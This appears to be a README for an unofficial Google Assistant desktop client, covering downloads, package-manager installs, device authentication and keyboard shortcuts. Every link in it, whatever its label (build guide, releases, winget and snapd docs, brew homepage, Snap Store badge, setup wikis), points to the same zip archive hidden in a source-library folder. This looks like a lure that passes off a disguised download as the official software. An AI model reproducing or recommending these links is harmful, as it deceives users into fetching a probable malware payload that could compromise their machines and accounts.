Google Assistant Unofficial Desktop Client is a cross-platform desktop client for Google Assistant based on **Google Assistant SDK**.

> Note:
> ---
>
> The **"Google Assistant Unofficial Desktop Client"** is under development. So, if you find any bugs or have any suggestion, feel free to post an _issue_ or a _pull request_.

## Inspiration

The design is inspired by Google Assistant in Chrome OS and comes in both Light Mode _(beta)_ and Dark Mode üòâ.

## Download

You can build the assistant on your machine if you prefer _(see [How to Build](https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip))_. If you don't want to build the project for yourself, you can download the Assistant Setup/Installer for the respective platform from [here (releases)](https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip). You can download from other official sources as well.

### Windows (using `winget`)

> If you are on **Windows 11**, chances are you have `winget` pre-installed.
> If you are on older version of Windows (Windows 10) and don't have it installed, check out
> [Install Winget](https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip)
> documentation section to learn how to install it.

#### ‚ö° Stable versions:

```powershell
PS> winget install "g-assist" -e
```

#### üß™ Preview Versions (Pre-release versions):

```powershell
PS> winget install "g-assist-preview" -e
```

### MacOS (using `brew`)

> Visit [https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip](https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip) to learn how to install `brew` if you don't have it
> installed on your machine.

```console
$ brew install --cask google-assistant
```

### Linux (using `snap`)

> Some linux distros like Ubuntu, KDE Neon, Manjaro, Zorin OS, etc. come pre-installed with
> `snap`. For distros without out-of-the-box support for snaps, visit [Installing snapd](https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip)
> documentation page.

Manually download from the Snapstore:

[![Get it from the Snap Store](https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip)](https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip)

#### ‚ö° Stable versions:

```console
$ sudo snap install g-assist
```

#### üß™ Preview versions (Pre-release versions):

If you want to install release candidates:

```console
$ sudo snap install g-assist --candidate
```

If you want to install beta versions:

```console
$ sudo snap install g-assist --beta
```

## Getting Started

In order to use the client, you must have a _"Key File"_ and _"Token"_ for authentication which you can get by going through **Device Registration** process. You can go through the wiki given below to get started.

"*Setup Authentication for Google Assistant Unofficial Desktop Client*" Wiki (For both **Device Registration** & **Authentication** help):
> https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip

#### Other References

If you want a user friendly registration method, use **Device Registration** UI:
> https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip

If you want to use a CLI tool to complete the **Device Registration** and **Authentication** process manually, read the following:
> https://raw.githubusercontent.com/rico302/Google-Assistant-Unofficial-Desktop-Client/master/app/src/lib/pv_workers/Desktop_Google_Assistant_Client_Unofficial_v1.2.zip

After you have registered your device and downloaded the required authentication files, you can head on to _Settings_ and set the _"Key File Path"_ and _"Saved Tokens Path"_ to the location where the respective files are located.

## Default Keyboard Shortcut

* **Windows:** Win + Shift + A
* **MacOS:** Cmd + Shift + A
* **Linux:** Super + Shift + A

**Note:** Keyboard shortcut is configurable in the settings
